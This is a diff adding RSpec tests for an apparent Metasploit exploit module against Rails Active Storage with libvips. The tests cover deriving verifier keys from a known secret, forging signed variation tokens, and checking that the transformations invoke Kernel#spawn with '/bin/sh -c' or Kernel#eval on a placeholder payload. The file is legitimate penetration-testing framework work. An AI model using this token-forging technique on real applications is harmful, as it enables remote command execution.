+++ spec/lib/msf/core/exploit/remote/http/rails_active_storage_vips/message_verifier_spec.rb
@@ -1,0 +1,141 @@
+# frozen_string_literal: true
+
+require 'spec_helper'
+require_relative 'support'
+
+RSpec.describe Msf::Exploit::Remote::HTTP::RailsActiveStorageVips::MessageVerifier do
+  include RailsActiveStorageVipsSpecSupport
+
+  subject(:host) { build_rails_active_storage_vips_host }
+
+  describe '#derive_verifier_key' do
+    let(:secret_key_base) { 'test-secret-key-base' }
+
+    it 'matches the Rails SHA1 key generator vector' do
+      expected = [
+        '5d7610692c916ec0b162d2c625aa48876a18b06667ff64b1660ce978d1e811fe' \
+        '03831e2149f89eaf9a2d6be105f6736452a0f2022fc12abd770063eb8c045fb7'
+      ].pack('H*')
+
+      expect(host.send(:derive_verifier_key, secret_key_base, 'sha1')).to eq(expected)
+    end
+
+    it 'matches the Rails SHA256 key generator vector' do
+      expected = [
+        '4c3df32bc45761c03c0260f7285d2122c71aa36f4c6c67859443c3bab954c417' \
+        '70361c4d6eff8195a953a251c88effa2edb53bde3411d5ba13125cce6152606c'
+      ].pack('H*')
+
+      expect(host.send(:derive_verifier_key, secret_key_base, 'sha256')).to eq(expected)
+    end
+  end
+
+  describe '#forged_variation' do
+    let(:transformations) { host.send(:command_transformations, 'id') }
+    let(:verifier_key) { host.send(:derive_verifier_key, 'test-secret-key-base', 'sha256') }
+
+    it 'uses a legacy JSON metadata envelope and standard padded Base64' do
+      serialized = host.send(:variation_payload, transformations, :json)
+      token = host.send(:forged_variation, verifier_key, serialized, 'sha1')
+      encoded, _separator, signature = token.rpartition('--')
+
+      expect(encoded).to eq(Base64.strict_encode64(serialized))
+      expect(signature).to eq(OpenSSL::HMAC.hexdigest('SHA1', verifier_key, encoded))
+
+      envelope = JSON.parse(Base64.strict_decode64(encoded))
+      inner = Base64.strict_decode64(envelope.fetch('_rails').fetch('message'))
+      expect(JSON.parse(inner)).to eq(transformations)
+    end
+
+    it 'serializes the same native transformations as a plain Marshal hash for legacy Rails defaults' do
+      serialized = host.send(:variation_payload, transformations, :marshal)
+      envelope = JSON.parse(serialized)
+      inner = Base64.strict_decode64(envelope.fetch('_rails').fetch('message'))
+
+      expect(inner).to eq(Marshal.dump(transformations))
+      expect(inner).to start_with("\x04\x08".b)
+    end
+
+    it 'infers JSON, Marshal, MessagePack fallback, and verifier settings from signed blob IDs' do
+      modern_json = { _rails: { data: 47, pur: 'blob_id' } }.to_json
+      modern_encoded = Base64.urlsafe_encode64(modern_json, padding: false)
+      modern_token = "#{modern_encoded}--#{'a' * 64}"
+
+      marshaled_blob_id = Marshal.dump(47)
+      legacy_marshal = {
+        _rails: {
+          message: Base64.strict_encode64(marshaled_blob_id),
+          exp: nil,
+          pur: 'blob_id'
+        }
+      }.to_json
+      legacy_token = "#{Base64.strict_encode64(legacy_marshal)}--#{'b' * 40}"
+      message_pack_token = "#{Base64.strict_encode64("\xcc\x80\x01".b)}--#{'c' * 96}"
+
+      modern_info = host.send(:signed_token_info, modern_token)
+      legacy_info = host.send(:signed_token_info, legacy_token)
+      message_pack_info = host.send(:signed_token_info, message_pack_token)
+
+      expect(modern_info.values_at(:message_serializer, :verifier_digest)).to eq([:json, 'sha256'])
+      expect(legacy_info.values_at(:message_serializer, :verifier_digest)).to eq([:marshal, 'sha1'])
+      expect(message_pack_info.values_at(:message_serializer, :verifier_digest)).to eq([:json, 'sha384'])
+    end
+
+    it 'uses the send/spawn operation supported throughout image_processing 1.x' do
+      expect(transformations).to eq('send' => ['spawn', '/bin/sh', '-c', 'id'])
+    end
+
+    it 'uses the send/eval operation for the native Ruby target' do
+      expect(host.send(:ruby_transformations, 'RUBY_PAYLOAD')).to eq('send' => ['eval', 'RUBY_PAYLOAD'])
+    end
+
+    it 'validates every supported key-generator digest against a signed token' do
+      encoded = Base64.strict_encode64({ _rails: { data: 47, pur: 'blob_id' } }.to_json)
+
+      described_class::KEY_GENERATOR_DIGESTS.each do |digest|
+        verifier_key = host.send(:derive_verifier_key, 'test-secret-key-base', digest)
+        signature = OpenSSL::HMAC.hexdigest('SHA1', verifier_key, encoded)
+        info = host.send(:signed_token_info, "#{encoded}--#{signature}")
+
+        expect(host.send(:key_generator_digest_for, 'test-secret-key-base', info)).to eq(digest)
+      end
+    end
+  end
+
+  describe '#verify_known_secret_context' do
+    it 'falls back to and retains the Rails 6.0 legacy representation route' do
+      context = {
+        signed_id: 'blob',
+        verifier_key: 'key',
+        verifier_digest: 'sha1',
+        message_serializer: :json
+      }
+      allow(host).to receive(:forged_representation_path) do |candidate, transformations|
+        expect(transformations).to eq('resize_to_limit' => [1, 1])
+        "/#{candidate.fetch(:representation_route)}"
+      end
+      allow(host).to receive(:request_representation).with('/redirect').and_return(http_response(404))
+      allow(host).to receive(:request_representation).with('/legacy').and_return(http_response(200, body: "\x89PNG\r\n\x1a\n".b))
+
+      host.send(:verify_known_secret_context, context)
+
+      expect(context[:representation_route]).to eq(:legacy)
+    end
+  end
+
+  describe '#variation_transformations' do
+    before { allow(host).to receive(:payload).and_return(double('payload', encoded: 'PAYLOAD')) }
+
+    it 'dispatches Kernel#spawn for the default command target' do
+      allow(host).to receive(:target).and_return('Type' => :unix_cmd)
+
+      expect(host.send(:variation_transformations)).to eq('send' => ['spawn', '/bin/sh', '-c', 'PAYLOAD'])
+    end
+
+    it 'dispatches Kernel#eval for the native Ruby target' do
+      allow(host).to receive(:target).and_return('Type' => :ruby)
+
+      expect(host.send(:variation_transformations)).to eq('send' => ['eval', 'PAYLOAD'])
+    end
+  end
+end
